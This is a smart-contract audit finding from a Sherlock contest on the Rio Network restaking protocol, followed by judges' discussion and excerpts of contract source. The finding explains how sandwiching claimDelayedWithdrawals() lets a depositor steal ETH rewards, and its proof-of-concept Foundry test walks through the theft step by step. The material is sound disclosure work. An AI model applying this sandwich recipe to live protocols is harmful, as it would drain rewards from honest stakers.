{
  "Title": "M-3: A part of ETH rewards can be stolen by sandwiching `claimDelayedWithdrawals()`",
  "Content": "# Issue M-3: A part of ETH rewards can be stolen by sandwiching `claimDelayedWithdrawals()` \n\nSource: https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/52 \n\nThe protocol has acknowledged this issue.\n\n## Found by \naraj, aslanbek, cats, giraffe, pontifex, zzykxx\n## Summary\nRewards can be stolen by sandwiching the call to [EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/DelayedWithdrawalRouter.sol#L99).\n\n## Vulnerability Detail\nThe protocol handles ETH rewards by sending them to the [rewards distributor](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTRewardDistributor.sol). There are at least 3 flows that end-up sending funds there:\n1. When the function [RioLRTOperatorDelegator::scrapeNonBeaconChainETHFromEigenPod()](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTOperatorDelegator.sol#L150) is called to scrape non beacon chain ETH from an Eigenpod.\n2. When a validator receives rewards via partial withdrawals after the function [EigenPod::verifyAndProcessWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/EigenPod.sol#L232) is called.\n3. When a validator exists and has more than 32ETH the excess will be sent as rewards after the function [EigenPod::verifyAndProcessWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/EigenPod.sol#L232) is called.\n\nAll of these 3 flows end up queuing a withdrawal to the [rewards distributor](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTRewardDistributor.sol). After a delay the rewards can claimed by calling the permissionless function [EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/DelayedWithdrawalRouter.sol#L99), this call will instantly increase the TVL of the protocol.\n\nAn attacker can take advantage of this to steal a part of the rewards:\n1. Mint a sensible amount of `LRTTokens` by depositing an accepted asset\n2. Call [EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/DelayedWithdrawalRouter.sol#L99), after which the value of the `LRTTokens` just minted will immediately increase.\n3. Request a withdrawal for all the `LRTTokens` via [RioLRTCoordinator::requestWithdrawal()](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTCoordinator.sol#L99).\n\n### POC\nChange [RioLRTRewardsDistributor::receive()](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTOperatorDelegator.sol#L244-L246) (to side-step a gas limit bug:\n```solidity\nreceive() external payable {\n    (bool success,) = address(rewardDistributor()).call{value: msg.value}('');\n    require(success);\n}\n```\n\nAdd the following imports to `RioLRTOperatorDelegator`:\n```solidity\nimport {IRioLRTWithdrawalQueue} from 'contracts/interfaces/IRioLRTWithdrawalQueue.sol';\nimport {IRioLRTOperatorRegistry} from 'contracts/interfaces/IRioLRTOperatorRegistry.sol';\nimport {CredentialsProofs, BeaconWithdrawal} from 'test/utils/beacon-chain/MockBeaconChain.sol';\n```\nTo copy-paste in `RioLRTOperatorDelegator.t.sol`:\n\n```solidity\nfunction test_stealRewards() public {\n    address alice = makeAddr(\"alice\");\n    address bob = makeAddr(\"bob\");\n    uint256 aliceInitialBalance = 40e18;\n    uint256 bobInitialBalance = 40e18;\n    deal(alice, aliceInitialBalance);\n    deal(bob, bobInitialBalance);\n    vm.prank(alice);\n    reETH.token.approve(address(reETH.coordinator), type(uint256).max);\n    vm.prank(bob);\n    reETH.token.approve(address(reETH.coordinator), type(uint256).max);\n\n    //->Operator delegator and validators are added to the protocol\n    uint8 operatorId = addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor));\n    RioLRTOperatorDelegator operatorDelegator =\n        RioLRTOperatorDelegator(payable(reETH.operatorRegistry.getOperatorDetails(operatorId).delegator));\n\n    //-> Alice deposits ETH in the protocol\n    vm.prank(alice);\n    reETH.coordinator.depositETH{value: aliceInitialBalance}();\n    \n    //-> Rebalance is called and the ETH deposited in a validator\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    //-> Create a new validator with a 40ETH balance and verify his credentials.\n    //-> This is to \"simulate\" rewards accumulation\n    uint40[] memory validatorIndices = new uint40[](1);\n    IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorId);\n    bytes32 withdrawalCredentials = operatorDelegator.withdrawalCredentials();\n    beaconChain.setNextTimestamp(block.timestamp);\n    CredentialsProofs memory proofs;\n    (validatorIndices[0], proofs) = beaconChain.newValidator({\n        balanceWei: 40 ether,\n        withdrawalCreds: abi.encodePacked(withdrawalCredentials)\n    });\n    \n    //-> Verify withdrawal crendetials\n    vm.prank(details.manager);\n    reETH.operatorRegistry.verifyWithdrawalCredentials(\n        operatorId,\n        proofs.oracleTimestamp,\n        proofs.stateRootProof,\n        proofs.validatorIndices,\n        proofs.validatorFieldsProofs,\n        proofs.validatorFields\n    );\n\n    //-> A full withdrawal for the validator is processed, 8ETH (40ETH - 32ETH) will be queued as rewards\n    verifyAndProcessWithdrawalsForValidatorIndexes(address(operatorDelegator), validatorIndices);\n\n    //-> Bob, an attacker, does the following:\n    //      1. Deposits 40ETH and receives ~40e18 LRTTokens\n    //      2. Cliam the withdrawal for the validator, which will instantly increase the TVL by ~7.2ETH\n    //      3. Requests a withdrawal with all of the LRTTokens \n    {\n        //1. Deposits 40ETH and receives ~40e18 LRTTokens\n        vm.startPrank(bob);\n        reETH.coordinator.depositETH{value: bobInitialBalance}();\n\n        //2. Cliam the withdrawal for the validator, which will instantly increase the TVL by ~7.2ETH\n        uint256 TVLBefore = reETH.assetRegistry.getTVL();\n        delayedWithdrawalRouter.claimDelayedWithdrawals(address(operatorDelegator), 1); \n        uint256 TVLAfter = reETH.assetRegistry.getTVL();\n\n        //->TVL increased by 7.2ETH\n        assertEq(TVLAfter - TVLBefore, 7.2e18);\n\n        //3. Requests a withdrawal with all of the LRTTokens \n        reETH.coordinator.requestWithdrawal(ETH_ADDRESS, reETH.token.balanceOf(bob));\n        vm.stopPrank();\n    }\n    \n    //-> Wait and rebalance\n    skip(reETH.coordinator.rebalanceDelay());\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    //-> Bob withdraws the funds he requested\n    vm.prank(bob);\n    reETH.withdrawalQueue.claimWithdrawalsForEpoch(IRioLRTWithdrawalQueue.ClaimRequest({asset: ETH_ADDRESS, epoch: 0}));\n\n    //-> Bob has stole ~50% of the rewards and has 3.59ETH more than he initially started with\n    assertGt(bob.balance, bobInitialBalance);\n    assertEq(bob.balance - bobInitialBalance, 3599550056000000000);\n}\n```\n\n## Impact\nRewards can be stolen by sandwiching the call to [EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/DelayedWithdrawalRouter.sol#L99), however this requires a bigger investment in funds the higher the protocol TVL.\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\nWhen requesting withdrawals via [RioLRTCoordinator::requestWithdrawal()](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTCoordinator.sol#L99) don't distribute the rewards received in the current epoch.\n\n\n\n## Discussion\n\n**KupiaSecAdmin**\n\nEscalate\n\nThis should be considered as Invalid.\nThe logic is pretty natural and this sandwiching can not be considered as attack.\n`claimDelayedWithdrawals` should be called at some point by anyone, and minting transactions come before the claim transaction and requestWithdrawal transactions come after claim transaction is natural logic.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> This should be considered as Invalid.\n> The logic is pretty natural and this sandwiching can not be considered as attack.\n> `claimDelayedWithdrawals` should be called at some point by anyone, and minting transactions come before the claim transaction and requestWithdrawal transactions come after claim transaction is natural logic.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**0xcats**\n\n> Escalate\n> \n> This should be considered as Invalid. The logic is pretty natural and this sandwiching can not be considered as attack. `claimDelayedWithdrawals` should be called at some point by anyone, and minting transactions come before the claim transaction and requestWithdrawal transactions come after claim transaction is natural logic.\n\nYou can take a look at my issue of #22.\n\nI don't really understand how you can say this is natural and that sandwiching is not considered an attack? Honest users have absolutely no incentive to stake their funds for continuous periods of time if anyone can just come and front-run reward distribution and steal rewards.\n\n**nevillehuang**\n\nI'm also unsure how this is considered normal logic unless otherwise stated as an known risk, which is not. Any user diluting rewards/stealing rewards seems fair to be valid to me.\n\n**Czar102**\n\nI agree with @0xcats and @nevillehuang. Planning to reject the escalation and leave the issue as is.\n\n**Czar102**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [KupiaSecAdmin](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/52/#issuecomment-2022992949): rejected\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/176",
  "Code": [
    {
      "filename": "src/contracts/pods/DelayedWithdrawalRouter.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity =0.8.12;\n\nimport \"@openzeppelin-upgrades/contracts/proxy/utils/Initializable.sol\";\nimport \"@openzeppelin-upgrades/contracts/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin-upgrades/contracts/security/ReentrancyGuardUpgradeable.sol\";\nimport \"../interfaces/IEigenPodManager.sol\";\nimport \"../interfaces/IDelayedWithdrawalRouter.sol\";\nimport \"../permissions/Pausable.sol\";\n\ncontract DelayedWithdrawalRouter is\n    Initializable,\n    OwnableUpgradeable,\n    ReentrancyGuardUpgradeable,\n    Pausable,\n    IDelayedWithdrawalRouter\n{\n    // index for flag that pauses withdrawals (i.e. 'delayedWithdrawal claims') when set\n    uint8 internal constant PAUSED_DELAYED_WITHDRAWAL_CLAIMS = 0;\n\n    /**\n     * @notice Delay enforced by this contract for completing any delayedWithdrawal. Measured in blocks, and adjustable by this contract's owner,\n     * up to a maximum of `MAX_WITHDRAWAL_DELAY_BLOCKS`. Minimum value is 0 (i.e. no delay enforced).\n     */\n    uint256 public withdrawalDelayBlocks;\n    // the number of 12-second blocks in 30 days (60 * 60 * 24 * 30 / 12 = 216,000)\n    uint256 public constant MAX_WITHDRAWAL_DELAY_BLOCKS = 216000;\n\n    /// @notice The EigenPodManager contract of EigenLayer.\n    IEigenPodManager public immutable eigenPodManager;\n\n    /// @notice Mapping: user => struct storing all delayedWithdrawal info. Marked as internal with an external getter function named `userWithdrawals`\n    mapping(address => UserDelayedWithdrawals) internal _userWithdrawals;\n\n    /// @notice Modifier used to permission a function to only be called by the EigenPod of the specified `podOwner`\n    modifier onlyEigenPod(address podOwner) {\n        require(\n            address(eigenPodManager.getPod(podOwner)) == msg.sender,\n            \"DelayedWithdrawalRouter.onlyEigenPod: not podOwner's EigenPod\"\n        );\n        _;\n    }\n\n    constructor(IEigenPodManager _eigenPodManager) {\n        require(\n            address(_eigenPodManager) != address(0),\n            \"DelayedWithdrawalRouter.constructor: _eigenPodManager cannot be zero address\"\n        );\n        eigenPodManager = _eigenPodManager;\n    }\n\n    function initialize(\n        address initOwner,\n        IPauserRegistry _pauserRegistry,\n        uint256 initPausedStatus,\n        uint256 _withdrawalDelayBlocks\n    ) external initializer {\n        _transferOwnership(initOwner);\n        _initializePauser(_pauserRegistry, initPausedStatus);\n        _setWithdrawalDelayBlocks(_withdrawalDelayBlocks);\n    }\n\n    /**\n     * @notice Creates a delayed withdrawal for `msg.value` to the `recipient`.\n     * @dev Only callable by the `podOwner`'s EigenPod contract.\n     */\n    function createDelayedWithdrawal(\n        address podOwner,\n        address recipient\n    ) external payable onlyEigenPod(podOwner) onlyWhenNotPaused(PAUSED_DELAYED_WITHDRAWAL_CLAIMS) {\n        require(\n            recipient != address(0),\n            \"DelayedWithdrawalRouter.createDelayedWithdrawal: recipient cannot be zero address\"\n        );\n        uint224 withdrawalAmount = uint224(msg.value);\n        if (withdrawalAmount != 0) {\n            DelayedWithdrawal memory delayedWithdrawal = DelayedWithdrawal({\n                amount: withdrawalAmount,\n                blockCreated: uint32(block.number)\n            });\n            _userWithdrawals[recipient].delayedWithdrawals.push(delayedWithdrawal);\n            emit DelayedWithdrawalCreated(\n                podOwner,\n                recipient,\n                withdrawalAmount,\n                _userWithdrawals[recipient].delayedWithdrawals.length - 1\n            );\n        }\n    }\n\n    /**\n     * @notice Called in order to withdraw delayed withdrawals made to the `recipient` that have passed the `withdrawalDelayBlocks` period.\n     * @param recipient The address to claim delayedWithdrawals for.\n     * @param maxNumberOfDelayedWithdrawalsToClaim Used to limit the maximum number of delayedWithdrawals to loop through claiming.\n     * @dev\n     *      WARNING: Note that the caller of this function cannot control where the funds are sent, but they can control when the\n     *              funds are sent once the withdrawal becomes claimable.\n     */\n    function claimDelayedWithdrawals(\n        address recipient,\n        uint256 maxNumberOfDelayedWithdrawalsToClaim\n    ) external nonReentrant onlyWhenNotPaused(PAUSED_DELAYED_WITHDRAWAL_CLAIMS) {\n        _claimDelayedWithdrawals(recipient, maxNumberOfDelayedWithdrawalsToClaim);\n    }\n\n    /**\n     * @notice Called in order to withdraw delayed withdrawals made to the caller that have passed the `withdrawalDelayBlocks` period.\n     * @param maxNumberOfDelayedWithdrawalsToClaim Used to limit the maximum number of delayedWithdrawals to loop through claiming.\n     */\n    function claimDelayedWithdrawals(\n        uint256 maxNumberOfDelayedWithdrawalsToClaim\n    ) external nonReentrant onlyWhenNotPaused(PAUSED_DELAYED_WITHDRAWAL_CLAIMS) {\n        _claimDelayedWithdrawals(msg.sender, maxNumberOfDelayedWithdrawalsToClaim);\n    }\n\n    /// @notice Owner-only function for modifying the value of the `withdrawalDelayBlocks` variable.\n    function setWithdrawalDelayBlocks(uint256 newValue) external onlyOwner {\n        _setWithdrawalDelayBlocks(newValue);\n    }\n\n    /// @notice Getter function for the mapping `_userWithdrawals`\n    function userWithdrawals(address user) external view returns (UserDelayedWithdrawals memory) {\n        return _userWithdrawals[user];\n    }\n\n    /// @notice Getter function to get all delayedWithdrawals of the `user`\n    function getUserDelayedWithdrawals(address user) external view returns (DelayedWithdrawal[] memory) {\n        uint256 delayedWithdrawalsCompleted = _userWithdrawals[user].delayedWithdrawalsCompleted;\n        uint256 totalDelayedWithdrawals = _userWithdrawals[user].delayedWithdrawals.length;\n        uint256 userDelayedWithdrawalsLength = totalDelayedWithdrawals - delayedWithdrawalsCompleted;\n        DelayedWithdrawal[] memory userDelayedWithdrawals = new DelayedWithdrawal[](userDelayedWithdrawalsLength);\n        for (uint256 i = 0; i < userDelayedWithdrawalsLength; i++) {\n            userDelayedWithdrawals[i] = _userWithdrawals[user].delayedWithdrawals[delayedWithdrawalsCompleted + i];\n        }\n        return userDelayedWithdrawals;\n    }\n\n    /// @notice Getter function to get all delayedWithdrawals that are currently claimable by the `user`\n    function getClaimableUserDelayedWithdrawals(address user) external view returns (DelayedWithdrawal[] memory) {\n        uint256 delayedWithdrawalsCompleted = _userWithdrawals[user].delayedWithdrawalsCompleted;\n        uint256 totalDelayedWithdrawals = _userWithdrawals[user].delayedWithdrawals.length;\n        uint256 userDelayedWithdrawalsLength = totalDelayedWithdrawals - delayedWithdrawalsCompleted;\n\n        uint256 firstNonClaimableWithdrawalIndex = userDelayedWithdrawalsLength;\n\n        for (uint256 i = 0; i < userDelayedWithdrawalsLength; i++) {\n            DelayedWithdrawal memory delayedWithdrawal = _userWithdrawals[user].delayedWithdrawals[\n                delayedWithdrawalsCompleted + i\n            ];\n            // check if delayedWithdrawal can be claimed. break the loop as soon as a delayedWithdrawal cannot be claimed\n            if (block.number < delayedWithdrawal.blockCreated + withdrawalDelayBlocks) {\n                firstNonClaimableWithdrawalIndex = i;\n                break;\n            }\n        }\n        uint256 numberOfClaimableWithdrawals = firstNonClaimableWithdrawalIndex;\n        DelayedWithdrawal[] memory claimableDelayedWithdrawals = new DelayedWithdrawal[](numberOfClaimableWithdrawals);\n\n        if (numberOfClaimableWithdrawals != 0) {\n            for (uint256 i = 0; i < numberOfClaimableWithdrawals; i++) {\n                claimableDelayedWithdrawals[i] = _userWithdrawals[user].delayedWithdrawals[\n                    delayedWithdrawalsCompleted + i\n                ];\n            }\n        }\n        return claimableDelayedWithdrawals;\n    }\n\n    /// @notice Getter function for fetching the delayedWithdrawal at the `index`th entry from the `_userWithdrawals[user].delayedWithdrawals` array\n    function userDelayedWithdrawalByIndex(\n        address user,\n        uint256 index\n    ) external view returns (DelayedWithdrawal memory) {\n        return _userWithdrawals[user].delayedWithdrawals[index];\n    }\n\n    /// @notice Getter function for fetching the length of the delayedWithdrawals array of a specific user\n    function userWithdrawalsLength(address user) external view returns (uint256) {\n        return _userWithdrawals[user].delayedWithdrawals.length;\n    }\n\n    /// @notice Convenience function for checking whether or not the delayedWithdrawal at the `index`th entry from the `_userWithdrawals[user].delayedWithdrawals` array is currently claimable\n    function canClaimDelayedWithdrawal(address user, uint256 index) external view returns (bool) {\n        return ((index >= _userWithdrawals[user].delayedWithdrawalsCompleted) &&\n            (block.number >= _userWithdrawals[user].delayedWithdrawals[index].blockCreated + withdrawalDelayBlocks));\n    }\n\n    /// @notice internal function used in both of the overloaded `claimDelayedWithdrawals` functions\n    function _claimDelayedWithdrawals(address recipient, uint256 maxNumberOfDelayedWithdrawalsToClaim) internal {\n        uint256 amountToSend = 0;\n        uint256 delayedWithdrawalsCompletedBefore = _userWithdrawals[recipient].delayedWithdrawalsCompleted;\n        uint256 _userWithdrawalsLength = _userWithdrawals[recipient].delayedWithdrawals.length;\n        uint256 i = 0;\n        while (\n            i < maxNumberOfDelayedWithdrawalsToClaim && (delayedWithdrawalsCompletedBefore + i) < _userWithdrawalsLength\n        ) {\n            // copy delayedWithdrawal from storage to memory\n            DelayedWithdrawal memory delayedWithdrawal = _userWithdrawals[recipient].delayedWithdrawals[\n                delayedWithdrawalsCompletedBefore + i\n            ];\n            // check if delayedWithdrawal can be claimed. break the loop as soon as a delayedWithdrawal cannot be claimed\n            if (block.number < delayedWithdrawal.blockCreated + withdrawalDelayBlocks) {\n                break;\n            }\n            // otherwise, the delayedWithdrawal can be claimed, in which case we increase the amountToSend and increment i\n            amountToSend += delayedWithdrawal.amount;\n            // increment i to account for the delayedWithdrawal being claimed\n            unchecked {\n                ++i;\n            }\n        }\n        // mark the i delayedWithdrawals as claimed\n        _userWithdrawals[recipient].delayedWithdrawalsCompleted = delayedWithdrawalsCompletedBefore + i;\n        // actually send the ETH\n        if (amountToSend != 0) {\n            AddressUpgradeable.sendValue(payable(recipient), amountToSend);\n        }\n        emit DelayedWithdrawalsClaimed(recipient, amountToSend, delayedWithdrawalsCompletedBefore + i);\n    }\n\n    /// @notice internal function for changing the value of `withdrawalDelayBlocks`. Also performs sanity check and emits an event.\n    function _setWithdrawalDelayBlocks(uint256 newValue) internal {\n        require(\n            newValue <= MAX_WITHDRAWAL_DELAY_BLOCKS,\n            \"DelayedWithdrawalRouter._setWithdrawalDelayBlocks: newValue too large\"\n        );\n        emit WithdrawalDelayBlocksSet(withdrawalDelayBlocks, newValue);\n        withdrawalDelayBlocks = newValue;\n    }\n\n    /**\n     * @dev This empty reserved space is put in place to allow future versions to add new\n     * variables without shifting down storage in the inheritance chain.\n     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps\n     */\n    uint256[48] private __gap;\n}"
    },
    {
      "filename": "rio-sherlock-audit/contracts/restaking/RioLRTOperatorDelegator.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.23;\n\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport {SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {IRioLRTOperatorDelegator} from 'contracts/interfaces/IRioLRTOperatorDelegator.sol';\nimport {IDelegationManager} from 'contracts/interfaces/eigenlayer/IDelegationManager.sol';\nimport {IBeaconChainProofs} from 'contracts/interfaces/eigenlayer/IBeaconChainProofs.sol';\nimport {IStrategyManager} from 'contracts/interfaces/eigenlayer/IStrategyManager.sol';\nimport {IEigenPodManager} from 'contracts/interfaces/eigenlayer/IEigenPodManager.sol';\nimport {ISignatureUtils} from 'contracts/interfaces/eigenlayer/ISignatureUtils.sol';\nimport {IEigenPod} from 'contracts/interfaces/eigenlayer/IEigenPod.sol';\nimport {RioLRTCore} from 'contracts/restaking/base/RioLRTCore.sol';\nimport {Memory} from 'contracts/utils/Memory.sol';\nimport {Array} from 'contracts/utils/Array.sol';\nimport {Asset} from 'contracts/utils/Asset.sol';\nimport {\n    BEACON_CHAIN_STRATEGY,\n    BLS_PUBLIC_KEY_LENGTH,\n    BLS_SIGNATURE_LENGTH,\n    ETH_DEPOSIT_SIZE,\n    ETH_DEPOSIT_SIZE_IN_GWEI_LE64\n} from 'contracts/utils/Constants.sol';\n\ncontract RioLRTOperatorDelegator is IRioLRTOperatorDelegator, RioLRTCore {\n    using SafeERC20 for IERC20;\n    using Asset for *;\n    using Array for *;\n\n    /// @dev The withdrawal credentials prefix, which signals that withdrawals are enabled.\n    bytes1 internal constant WITHDRAWALS_ENABLED_PREFIX = 0x01;\n\n    /// @dev The minimum amount of excess ETH from full withdrawals that can be scraped from the EigenPod.\n    uint256 internal constant MIN_EXCESS_FULL_WITHDRAWAL_ETH_FOR_SCRAPE = 1 ether;\n\n    /// @notice The primary entry and exit-point for funds into and out of EigenLayer.\n    IStrategyManager public immutable strategyManager;\n\n    /// @notice The contract used for creating and managing EigenPods.\n    IEigenPodManager public immutable eigenPodManager;\n\n    /// @notice The primary delegation contract for EigenLayer.\n    IDelegationManager public immutable delegationManager;\n\n    /// @notice The operator delegator's EigenPod.\n    IEigenPod public eigenPod;\n\n    /// @notice Credentials to withdraw ETH on Consensus Layer via the EigenPod.\n    bytes32 public withdrawalCredentials;\n\n    /// @notice The amount of ETH queued for withdrawal to the withdrawal queue, intended for settling\n    /// user withdrawals, in gwei.\n    uint64 public ethQueuedForUserSettlementGwei;\n\n    /// @notice The amount of ETH queued for withdrawal to the deposit pool, specifically for facilitating\n    /// operator exits and excess full withdrawal scrapes, in gwei.\n    uint64 public ethQueuedForOperatorExitsAndScrapesGwei;\n\n    /// @param issuer_ The issuer of the LRT instance that this contract is deployed for.\n    /// @param strategyManager_ The primary entry and exit-point for funds into and out of EigenLayer.\n    /// @param eigenPodManager_ The contract used for creating and managing EigenPods.\n    /// @param delegationManager_ The primary delegation contract for EigenLayer.\n    constructor(address issuer_, address strategyManager_, address eigenPodManager_, address delegationManager_)\n        RioLRTCore(issuer_)\n    {\n        strategyManager = IStrategyManager(strategyManager_);\n        eigenPodManager = IEigenPodManager(eigenPodManager_);\n        delegationManager = IDelegationManager(delegationManager_);\n    }\n\n    // forgefmt: disable-next-item\n    /// @notice Initializes the contract by delegating to the provided EigenLayer operator.\n    /// @param token_ The address of the liquid restaking token.\n    /// @param operator The operator's address.\n    function initialize(address token_, address operator) external initializer {\n        __RioLRTCore_init_noVerify(token_);\n\n        if (msg.sender != address(operatorRegistry())) revert ONLY_OPERATOR_REGISTRY();\n\n        IDelegationManager.OperatorDetails memory operatorDetails = delegationManager.operatorDetails(operator);\n        if (operatorDetails.earningsReceiver != address(rewardDistributor())) revert INVALID_EARNINGS_RECEIVER();\n        if (operatorDetails.delegationApprover != address(0)) revert INVALID_DELEGATION_APPROVER();\n        if (operatorDetails.stakerOptOutWindowBlocks < operatorRegistry().minStakerOptOutBlocks()) {\n            revert INVALID_STAKER_OPT_OUT_BLOCKS();\n        }\n\n        delegationManager.delegateTo(\n            operator,\n            ISignatureUtils.SignatureWithExpiry(new bytes(0), 0),\n            bytes32(0)\n        );\n\n        // Deploy an EigenPod and set the withdrawal credentials to its address.\n        address eigenPodAddress = eigenPodManager.createPod();\n\n        eigenPod = IEigenPod(eigenPodAddress);\n        withdrawalCredentials = _computeWithdrawalCredentials(eigenPodAddress);\n    }\n\n    /// @notice Returns the number of shares in the operator delegator's EigenPod.\n    function getEigenPodShares() public view returns (int256) {\n        return eigenPodManager.podOwnerShares(address(this));\n    }\n\n    /// @notice The amount of ETH queued for withdrawal from EigenLayer, in wei.\n    function getETHQueuedForWithdrawal() public view returns (uint256) {\n        uint256 ethQueuedSlotData;\n        assembly {\n            ethQueuedSlotData := sload(ethQueuedForUserSettlementGwei.slot)\n        }\n\n        uint64 userSettlementGwei = uint64(ethQueuedSlotData);\n        uint64 operatorExitAndScrapeGwei = uint64(ethQueuedSlotData >> 64);\n\n        return (userSettlementGwei + operatorExitAndScrapeGwei).toWei();\n    }\n\n    /// @notice Returns the total amount of ETH under management by the operator delegator.\n    /// @dev This includes EigenPod shares (verified validator balances minus queued withdrawals)\n    /// and ETH queued for withdrawal from EigenLayer. Returns `0` if the total is negative.\n    function getETHUnderManagement() external view returns (uint256) {\n        int256 aum = getEigenPodShares() + int256(getETHQueuedForWithdrawal());\n        if (aum < 0) return 0;\n\n        return uint256(aum);\n    }\n\n    /// @notice Verifies withdrawal credentials of validator(s) owned by this operator.\n    /// It also verifies the effective balance of the validator(s).\n    /// @param oracleTimestamp The Beacon Chain timestamp whose state root the `proof` will be proven against.\n    /// @param stateRootProof Proves a `beaconStateRoot` against a block root fetched from the oracle.\n    /// @param validatorIndices The list of indices of the validators being proven, refer to consensus specs.\n    /// @param validatorFieldsProofs Proofs against the `beaconStateRoot` for each validator in `validatorFields`.\n    /// @param validatorFields The fields of the \"Validator Container\", refer to consensus specs.\n    function verifyWithdrawalCredentials(\n        uint64 oracleTimestamp,\n        IBeaconChainProofs.StateRootProof calldata stateRootProof,\n        uint40[] calldata validatorIndices,\n        bytes[] calldata validatorFieldsProofs,\n        bytes32[][] calldata validatorFields\n    ) external onlyOperatorRegistry {\n        eigenPod.verifyWithdrawalCredentials(\n            oracleTimestamp, stateRootProof, validatorIndices, validatorFieldsProofs, validatorFields\n        );\n    }\n\n    /// @notice Scrapes non-beacon chain ETH sitting in the operator delegator's\n    /// EigenPod to the reward distributor.\n    /// @dev Anyone can call this function.\n    function scrapeNonBeaconChainETHFromEigenPod() external {\n        eigenPod.withdrawNonBeaconChainETHBalanceWei(\n            address(rewardDistributor()), eigenPod.nonBeaconChainETHBalanceWei()\n        );\n    }\n\n    /// @notice Scrapes excess full withdrawal ETH from the operator delegator's EigenPod\n    /// to the deposit pool. ETH from full withdrawals may accumulate in the EigenPod over\n    /// time as full withdrawals contain more ETH than was requested from the withdrawal queue.\n    /// @dev Anyone can call this function.\n    function scrapeExcessFullWithdrawalETHFromEigenPod() external {\n        uint256 ethWithdrawable = eigenPod.withdrawableRestakedExecutionLayerGwei().toWei();\n        uint256 ethQueuedForWithdrawal = getETHQueuedForWithdrawal();\n        if (ethWithdrawable <= ethQueuedForWithdrawal + MIN_EXCESS_FULL_WITHDRAWAL_ETH_FOR_SCRAPE) {\n            revert INSUFFICIENT_EXCESS_FULL_WITHDRAWAL_ETH();\n        }\n        _queueWithdrawalForOperatorExitOrScrape(BEACON_CHAIN_STRATEGY, ethWithdrawable - ethQueuedForWithdrawal);\n    }\n\n    // forgefmt: disable-next-item\n    /// @notice Approve EigenLayer to spend an ERC20 token, then stake it into an EigenLayer strategy.\n    /// @param strategy The strategy to stake the tokens into.\n    /// @param token_ The token to stake.\n    /// @param amount The amount of tokens to stake.\n    function stakeERC20(address strategy, address token_, uint256 amount) external onlyDepositPool returns (uint256 shares) {\n        if (IERC20(token_).allowance(address(this), address(strategyManager)) < amount) {\n            IERC20(token_).forceApprove(address(strategyManager), type(uint256).max);\n        }\n        shares = strategyManager.depositIntoStrategy(strategy, token_, amount);\n    }\n\n    // forgefmt: disable-next-item\n    /// Stake ETH via the operator delegator's EigenPod, using the provided validator information.\n    /// @param validatorCount The number of validators to deposit into.\n    /// @param pubkeyBatch Batched validator public keys.\n    /// @param signatureBatch Batched validator signatures.\n    function stakeETH(uint256 validatorCount, bytes calldata pubkeyBatch, bytes calldata signatureBatch) external payable onlyDepositPool {\n        if (validatorCount == 0 || msg.value / ETH_DEPOSIT_SIZE != validatorCount) revert INVALID_VALIDATOR_COUNT();\n        if (pubkeyBatch.length != BLS_PUBLIC_KEY_LENGTH * validatorCount) {\n            revert INVALID_PUBLIC_KEYS_BATCH_LENGTH(pubkeyBatch.length, BLS_PUBLIC_KEY_LENGTH * validatorCount);\n        }\n        if (signatureBatch.length != BLS_SIGNATURE_LENGTH * validatorCount) {\n            revert INVALID_SIGNATURES_BATCH_LENGTH(signatureBatch.length, BLS_SIGNATURE_LENGTH * validatorCount);\n        }\n\n        bytes32 depositDataRoot;\n        bytes32 withdrawalCredentials_ = withdrawalCredentials;\n        bytes memory publicKey = Memory.unsafeAllocateBytes(BLS_PUBLIC_KEY_LENGTH);\n        bytes memory signature = Memory.unsafeAllocateBytes(BLS_SIGNATURE_LENGTH);\n        for (uint256 i = 0; i < validatorCount; ++i) {\n            Memory.copyBytes(pubkeyBatch, publicKey, i * BLS_PUBLIC_KEY_LENGTH, 0, BLS_PUBLIC_KEY_LENGTH);\n            